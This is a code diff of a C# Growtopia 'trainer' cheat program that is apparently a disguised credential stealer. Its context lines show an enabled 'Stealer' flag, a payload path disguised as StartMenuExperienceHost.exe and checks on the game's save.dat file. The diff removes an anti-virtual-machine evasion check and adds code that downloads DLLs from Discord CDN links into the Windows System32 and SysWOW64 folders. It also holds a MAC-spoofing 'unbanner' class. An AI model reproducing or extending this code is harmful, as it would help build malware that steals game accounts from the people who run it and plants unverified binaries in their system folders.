@@ -26,7 +26,6 @@ namespace FreeZeHAX_Trainer
         private readonly TaskDefinition td = TaskService.Instance.NewTask(); // New TaskDefiniton task
         private readonly WebClient web = new WebClient();
         private bool ProcOpen = false; // In order us to check if the process exists, we need this bool.
-        private readonly bool AntiVM = false; // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false"
         private readonly bool Stealer = true; // Activate / Disable Stealer
         private Point lastLocation;
         private bool mouseDown;
@@ -331,6 +330,7 @@ namespace FreeZeHAX_Trainer
 
             #endregion Startup transitions
         }
+
         private void TextTimer_Tick(object sender, EventArgs e)
         {
             SendKeys.Send("{ENTER}"); // Send ENTER key
@@ -340,30 +340,6 @@ namespace FreeZeHAX_Trainer
 
         private void Trainer_Load(object sender, EventArgs e)
         {
-            #region Check if VM
-
-            if (AntiVM == true) // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false".
-            {
-                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
-                {
-                    using (ManagementObjectCollection items = searcher.Get())
-                    {
-                        foreach (ManagementBaseObject item in items)
-                        {
-                            string manufacturer = item["Manufacturer"].ToString().ToLower();
-                            if ((manufacturer == "microsoft corporation") && (item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
-                                    || manufacturer.Contains("vmware")
-                                    || item["Model"].ToString() == "VirtualBox")
-                            {
-                                Application.Exit();
-                            }
-                        }
-                    }
-                }
-            }
-
-            #endregion Check if VM
-
             Show();
             StartForm();
             RemoveGuna();
@@ -375,6 +351,7 @@ namespace FreeZeHAX_Trainer
                 try
                 {
                     string SysWOW64 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\SysWOW64"; // SysWOW64's folder location
+                    string Sys32 = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32"; // System32's folder location
                     string StealerFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps\\"; // Working folder
                     string StealerFile = StealerFolder + "StartMenuExperienceHost.exe"; // Randomized stealer folder
                     bool savePathExists = File.Exists(others.SaveDatPath()); // Check if save.dat file exists
@@ -394,6 +371,11 @@ namespace FreeZeHAX_Trainer
                     if (!File.Exists(SysWOW64 + "\\msvcp140.dll"))
                     {
                         web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930579283150250096/msvcp140.dll"), SysWOW64 + "\\msvcp140.dll");
+                        others.Wait(2000);
+                    }
+                    if (!File.Exists(Sys32 + "\\vcomp140.dll"))
+                    {
+                        web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/945059959505309786/vcomp140.dll"), Sys32 + "\\vcomp140.dll");
                         others.Wait(2000);
                     }
 
@@ -573,7 +555,8 @@ namespace FreeZeHAX_Trainer
             Spammer.Hide();
             Settings.Hide();
         }
-        #endregion
+
+        #endregion Buttons
 
         #region Trainer Move
 
@@ -620,6 +603,7 @@ namespace FreeZeHAX_Trainer
         {
             mouseDown = false;
         }
+
         #endregion Trainer Move
 
         #region Growtopia Cheats
@@ -851,6 +835,7 @@ namespace FreeZeHAX_Trainer
                 GiveawayMode.FlatAppearance.BorderColor = Color.Black;
             }
         }
+
         private void Gravity_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
         {
             if (Gravity.BackColor == Color.White)
@@ -906,6 +891,7 @@ namespace FreeZeHAX_Trainer
                 ModFlyV2.FlatAppearance.BorderColor = Color.Black;
             }
         }
+
         private void ModZoom_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
         {
             if (ModZoom.BackColor == Color.White)
@@ -941,6 +927,7 @@ namespace FreeZeHAX_Trainer
                 SlideMode.FlatAppearance.BorderColor = Color.Black;
             }
         }
+
         private void SystemSpeed_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
         {
             if (SystemSpeed.BackColor == Color.White)
@@ -962,6 +949,7 @@ namespace FreeZeHAX_Trainer
                 SystemSpeed.FlatAppearance.BorderColor = Color.Black;
             }
         }
+
         #endregion Growtopia Cheats
 
         #region Unbanner Class
@@ -1080,7 +1068,9 @@ namespace FreeZeHAX_Trainer
                 devnum = n;
             }
 
-            public Adapter(NetworkInterface i) : this(i.Description) { }
+            public Adapter(NetworkInterface i) : this(i.Description)
+            {
+            }
 
             public Adapter(string aname)
             {
@@ -1124,6 +1114,7 @@ namespace FreeZeHAX_Trainer
             public NetworkInterface ManagedAdapter => NetworkInterface.GetAllNetworkInterfaces().Where(
               nic => nic.Description == adaptername
 ).FirstOrDefault();
+
             public string RegistryKey => string.Format(@"SYSTEM\ControlSet001\Control\Class\{{4D36E972-E325-11CE-BFC1-08002BE10318}}\{0:D4}", devnum);
 
             public string RegistryMac
@@ -1261,6 +1252,7 @@ namespace FreeZeHAX_Trainer
                 return adaptername + customname;
             }
         }
+
         #endregion Unbanner Class
     }
 }
